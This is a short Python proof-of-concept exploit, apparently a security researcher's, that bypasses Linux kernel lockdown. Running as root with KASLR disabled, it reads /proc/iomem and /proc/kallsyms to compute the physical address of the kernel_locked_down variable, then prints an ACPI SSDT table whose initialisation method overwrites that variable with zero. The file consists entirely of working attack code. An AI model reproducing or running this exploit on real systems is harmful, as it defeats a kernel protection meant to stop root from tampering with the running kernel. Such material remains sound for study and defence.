#!/usr/bin/python3
# Universal Linux lockdown bypass, thanks GRUB2 <3
import os
import sys

# The Linux ACPI battery driver won't be able to resist running this :)
ssdt_code = """
DefinitionBlock ("trigger.aml", "SSDT", 2, "", "", 0x00001001)
{
	OperationRegion (KMEM, SystemMemory, 0x%x, 4)

	Field (KMEM, DWordAcc, NoLock, WriteAsZeros)
	{
		LKDN, 32
	}

	Device (\\_SB_.HACK)
	{
		Name(_HID, EisaId ("PNP0C0A"))
		Name(_UID, 0x02)

		Method(_INI)
		{
			If (LKDN)
			{
				LKDN = Zero
			}
		}
	}
}
"""

# This only works as root
if os.getuid() != 0:
	print("This script must be run as root!", file=sys.stderr)
	exit(1)

# Make sure kernel ASLR is off
with open("/proc/cmdline") as f:
	if "nokaslr" not in f.read():
		print("Please add nokaslr to /etc/default/grub", file=sys.stderr)
		exit(1)

# Get the kernel load address in physical address space
for line in open("/proc/iomem"):
	if "Kernel code" in line:
		kernel_base = int(line.split("-")[0].strip(), 16)

# Get the virtual address of kernel_locked_down
for line in open("/proc/kallsyms"):
	if "kernel_locked_down" in line:
		kernel_locked_down = int(line.split(" ")[0].strip(), 16)

# Calculate the physical address of kernel_locked_down
kernel_locked_down &= ~0xffffffff80000000
kernel_locked_down += (kernel_base - 0x01000000)

print(ssdt_code %kernel_locked_down)
